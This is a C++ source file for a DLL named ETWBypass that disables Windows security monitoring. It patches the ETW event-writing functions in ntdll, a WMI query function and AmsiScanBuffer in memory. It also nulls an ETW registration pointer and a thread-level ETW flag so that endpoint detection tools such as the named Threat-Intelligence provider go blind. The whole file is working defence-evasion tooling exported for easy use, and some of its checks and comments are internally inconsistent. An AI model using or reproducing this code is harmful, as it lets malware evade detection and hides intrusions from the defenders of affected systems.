// ETWBypass.cpp - Advanced ETW/WMI Bypass Implementation
#include <Windows.h>
#include <winternl.h>
#include <evntprov.h>
#include <Psapi.h>
#include <iostream>
#include <vector>
#include <string>
#include <mutex>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

// Use SDK-provided EVENT_FILTER_DESCRIPTOR from evntprov.h

typedef NTSTATUS(NTAPI* pfnEtwEventWrite)(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData
);

typedef NTSTATUS(NTAPI* pfnEtwEventWriteFull)(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    USHORT EventProperty,
    const GUID* ActivityId,
    const GUID* RelatedActivityId,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData
);

typedef ULONG(NTAPI* pfnEtwEventWriteTransfer)(
    REGHANDLE RegHandle,
    PCEVENT_DESCRIPTOR EventDescriptor,
    LPCGUID ActivityId,
    LPCGUID RelatedActivityId,
    ULONG UserDataCount,
    PEVENT_DATA_DESCRIPTOR UserData
);

class ETWBypass {
private:
    std::mutex m_mutex;
    bool m_isPatched;
    struct PatchRecord {
        PVOID target = nullptr;
        std::vector<BYTE> originalBytes;
        PVOID stub = nullptr;
        SIZE_T stubSize = 0;
    };

    std::vector<PatchRecord> m_patchedFunctions;

    // Known ETW providers that EDRs use
    const std::vector<GUID> m_threateningProviders = {
        {0x5770385F, 0xC22A, 0x43E0, {0xBF, 0x4C, 0x06, 0xF5, 0x69, 0x8C, 0x2B, 0xD2}}, // Microsoft-Windows-Threat-Intelligence
        {0xE02A841C, 0x75A3, 0x4FA7, {0xAF, 0xC8, 0xAE, 0x09, 0xCF, 0x9B, 0x7F, 0x23}}, // Microsoft-Windows-Kernel-Process
        {0x22FB2CD6, 0x0E7B, 0x422B, {0xA0, 0xC7, 0x2F, 0xAD, 0x1F, 0xD0, 0xE7, 0x16}}, // Microsoft-Windows-Kernel-File
    };

public:
    ETWBypass() : m_isPatched(false) {
        std::cout << "[ETWBypass] Initialized" << std::endl;
    }

    ~ETWBypass() {
        if (m_isPatched) {
            RestoreAll();
        }
    }

    // Main bypass function - patches ETW functions in ntdll
    bool BypassETW() {
        std::lock_guard<std::mutex> lock(m_mutex);

        if (m_isPatched) {
            std::cout << "[ETWBypass] Already patched" << std::endl;
            return true;
        }

        bool success = true;

        success &= PatchEtwEventWrite();
        success &= PatchEtwEventWriteFull();
        success &= PatchEtwEventWriteTransfer();
        success &= PatchWMIFunctions();
        success &= DisableAMSI();

        m_isPatched = success;

        if (success) {
            std::cout << "[ETWBypass] Successfully bypassed ETW/WMI" << std::endl;
        } else {
            std::cerr << "[ETWBypass] Partial bypass achieved" << std::endl;
        }

        return success;
    }

    // Restore all patches
    bool RestoreAll() {
        std::lock_guard<std::mutex> lock(m_mutex);

        bool success = true;

        for (const auto& rec : m_patchedFunctions) {
            success &= RestorePatch(rec.target, rec.originalBytes);
            if (rec.stub && rec.stubSize) {
                VirtualFree(rec.stub, 0, MEM_RELEASE);
            }
        }

        m_patchedFunctions.clear();
        m_isPatched = false;

        return success;
    }

private:
        bool PatchEtwEventWrite() {
        return PatchFunction("EtwEventWrite");
    }

    bool PatchEtwEventWriteFull() {
        return PatchFunction("EtwEventWriteFull");
    }

    bool PatchEtwEventWriteTransfer() {
        return PatchFunction("EtwEventWriteTransfer");
    }

    bool PatchFunction(const char* name) {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) {
            std::cerr << "[ETWBypass] Failed to get ntdll handle" << std::endl;
            return false;
        }

        auto target = reinterpret_cast<BYTE*>(GetProcAddress(hNtdll, name));
        if (!target) {
            return true;
        }

        LPVOID stub = nullptr;
        SIZE_T stubSize = 0;
        if (!BuildEtwStub(stub, stubSize)) {
            return false;
        }

        std::vector<BYTE> patch;
        if (!EncodeAbsoluteJump(target, stub, patch)) {
            VirtualFree(stub, 0, MEM_RELEASE);
            return false;
        }

        if (!ApplyPatch(target, patch.data(), patch.size(), stub, stubSize)) {
            VirtualFree(stub, 0, MEM_RELEASE);
            return false;
        }

        return true;
    }

    bool BuildEtwStub(LPVOID& stubOut, SIZE_T& stubSizeOut) {
        std::vector<BYTE> stubBytes;
#if defined(_WIN64)
        stubBytes = { 0x48, 0x31, 0xC0, 0xC3 };
#else
        stubBytes = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
#endif

        stubSizeOut = stubBytes.size();
        LPVOID buffer = VirtualAlloc(nullptr, stubSizeOut, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!buffer) {
            std::cerr << "[ETWBypass] Failed to allocate stub memory" << std::endl;
            return false;
        }

        memcpy(buffer, stubBytes.data(), stubSizeOut);
        stubOut = buffer;
        return true;
    }

    bool EncodeAbsoluteJump(BYTE* target, LPVOID stub, std::vector<BYTE>& patchOut) {
        if (!target || !stub) {
            return false;
        }

#if defined(_WIN64)
        constexpr SIZE_T kJumpSize = 14;
        patchOut.assign(kJumpSize, 0x90);
        patchOut[0] = 0x48;
        patchOut[1] = 0xB8;
        uint64_t stubAddress = reinterpret_cast<uint64_t>(stub);
        memcpy(patchOut.data() + 2, &stubAddress, sizeof(stubAddress));
        patchOut[10] = 0xFF;
        patchOut[11] = 0xE0;
#else
        constexpr SIZE_T kJumpSize = 5;
        patchOut.assign(kJumpSize, 0x90);
        patchOut[0] = 0xE9;
        intptr_t displacement = reinterpret_cast<intptr_t>(stub) -
                                 (reinterpret_cast<intptr_t>(target) + static_cast<intptr_t>(kJumpSize));
        memcpy(patchOut.data() + 1, &displacement, sizeof(displacement));
#endif
        return true;
    }

// Patch WMI-related functions
    bool PatchWMIFunctions() {
        // Patch WmiQueryAllData
        HMODULE hAdvapi = GetModuleHandleW(L"advapi32.dll");
        if (!hAdvapi) return false;

        PVOID pWmiQuery = GetProcAddress(hAdvapi, "WmiQueryAllDataW");
        if (pWmiQuery) {
            BYTE patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
            ApplyPatch(pWmiQuery, patch, sizeof(patch));
        }

        return true;
    }

    // Disable AMSI (AntiMalware Scan Interface)
    bool DisableAMSI() {
        HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
        if (!hAmsi) {
            // AMSI not present (good for us)
            return true;
        }

        PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (!pAmsiScanBuffer) {
            FreeLibrary(hAmsi);
            return true;
        }

        // Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN
        // mov eax, 0x80070057; ret (return E_INVALIDARG)
        BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        bool result = ApplyPatch(pAmsiScanBuffer, patch, sizeof(patch));

        FreeLibrary(hAmsi);
        return result;
    }

    // Apply memory patch to a function
    bool ApplyPatch(PVOID pFunction, const BYTE* pPatch, SIZE_T patchSize) {
        if (!pFunction || !pPatch || patchSize == 0) {
            return false;
        }

        DWORD oldProtect = 0;
        if (!VirtualProtect(pFunction, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            std::cerr << "[ETWBypass] Failed to change memory protection: " << GetLastError() << std::endl;
            return false;
        }

        std::vector<BYTE> originalBytes(patchSize);
        memcpy(originalBytes.data(), pFunction, patchSize);

        memcpy(pFunction, pPatch, patchSize);

        DWORD temp = 0;
        VirtualProtect(pFunction, patchSize, oldProtect, &temp);
        FlushInstructionCache(GetCurrentProcess(), pFunction, patchSize);

        PatchRecord rec;
        rec.target = pFunction;
        rec.originalBytes = std::move(originalBytes);
        rec.stub = nullptr;
        rec.stubSize = 0;
        m_patchedFunctions.push_back(std::move(rec));
        return true;
    }

    // Overload that tracks allocated stub to free on restore
    bool ApplyPatch(PVOID pFunction, const BYTE* pPatch, SIZE_T patchSize, PVOID stubPtr, SIZE_T stubSize) {
        if (!ApplyPatch(pFunction, pPatch, patchSize)) {
            return false;
        }
        // Update last record with stub details
        if (!m_patchedFunctions.empty()) {
            auto& rec = m_patchedFunctions.back();
            rec.stub = stubPtr;
            rec.stubSize = stubSize;
        }
        return true;
    }

    // Restore a patched function
    bool RestorePatch(PVOID pFunction, const std::vector<BYTE>& originalBytes) {
        if (!pFunction || originalBytes.empty()) {
            return false;
        }

        DWORD oldProtect = 0;
        if (!VirtualProtect(pFunction, originalBytes.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
            return false;
        }

        memcpy(pFunction, originalBytes.data(), originalBytes.size());
        DWORD temp = 0;
        VirtualProtect(pFunction, originalBytes.size(), oldProtect, &temp);
        FlushInstructionCache(GetCurrentProcess(), pFunction, originalBytes.size());
        return true;
    }

public:
    // Advanced: Blind ETW by corrupting the provider registration
    bool BlindETW() {
        // This technique corrupts the ETW registration table
        // making it impossible for new providers to register

        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) return false;

        // Find EtwpRegistrationTable (undocumented)
        // This requires pattern scanning in ntdll
        PVOID pEtwpRegistrationTable = FindPattern(
            hNtdll,
            "\x48\x8B\x05\x00\x00\x00\x00\x48\x85\xC0\x74",
            "xxx????xxxx"
        );

        if (pEtwpRegistrationTable) {
            // Null out the registration table pointer
            DWORD oldProtect;
            if (VirtualProtect(pEtwpRegistrationTable, sizeof(PVOID), PAGE_READWRITE, &oldProtect)) {
                *(PVOID*)pEtwpRegistrationTable = NULL;
                VirtualProtect(pEtwpRegistrationTable, sizeof(PVOID), oldProtect, &oldProtect);
                std::cout << "[ETWBypass] Successfully blinded ETW" << std::endl;
                return true;
            }
        }

        return false;
    }

    // Pattern scanning helper
    PVOID FindPattern(HMODULE hModule, const char* pattern, const char* mask) {
        MODULEINFO modInfo;
        GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));

        const size_t patternLength = strlen(mask);
        BYTE* base = (BYTE*)hModule;
        const size_t sizeBytes = static_cast<size_t>(modInfo.SizeOfImage);

        for (size_t i = 0; i + patternLength < sizeBytes; i++) {
            bool found = true;
            for (size_t j = 0; j < patternLength; j++) {
                if (mask[j] == '?' || base[i + j] == pattern[j]) {
                    continue;
                }
                found = false;
                break;
            }

            if (found) {
                return &base[i];
            }
        }

        return NULL;
    }

    // Disable ETW for current thread only
    bool DisableETWForThread() {
        // Get TEB (Thread Environment Block)
        PTEB pTeb = NtCurrentTeb();

        // The ETW flag is at offset 0x1728 on x64
        // This disables ETW logging for this thread
        PVOID pEtwFlag = (PVOID)((PBYTE)pTeb + 0x1728);

        DWORD oldProtect;
        if (VirtualProtect(pEtwFlag, sizeof(PVOID), PAGE_READWRITE, &oldProtect)) {
            *(PVOID*)pEtwFlag = NULL;
            VirtualProtect(pEtwFlag, sizeof(PVOID), oldProtect, &oldProtect);
            return true;
        }

        return false;
    }

    // Check if ETW is currently active
    bool IsETWActive() {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) return false;

        pfnEtwEventWrite pEtwEventWrite = (pfnEtwEventWrite)GetProcAddress(hNtdll, "EtwEventWrite");
        if (!pEtwEventWrite) return false;

        // Check if the function has been patched
        BYTE firstBytes[3];
        memcpy(firstBytes, pEtwEventWrite, 3);

        // Check for our patch signature (xor eax, eax; ret)
        if (firstBytes[0] == 0x33 && firstBytes[1] == 0xC0 && firstBytes[2] == 0xC3) {
            return false; // ETW is patched/inactive
        }

        return true; // ETW is active
    }
};

// Global instance
ETWBypass g_ETWBypass;

// Export functions for easy use
extern "C" {
    __declspec(dllexport) bool BypassETW() {
        return g_ETWBypass.BypassETW();
    }

    __declspec(dllexport) bool RestoreETW() {
        return g_ETWBypass.RestoreAll();
    }

    __declspec(dllexport) bool BlindETW() {
        return g_ETWBypass.BlindETW();
    }

    __declspec(dllexport) bool DisableETWForThread() {
        return g_ETWBypass.DisableETWForThread();
    }

    __declspec(dllexport) bool IsETWActive() {
        return g_ETWBypass.IsETWActive();
    }
}
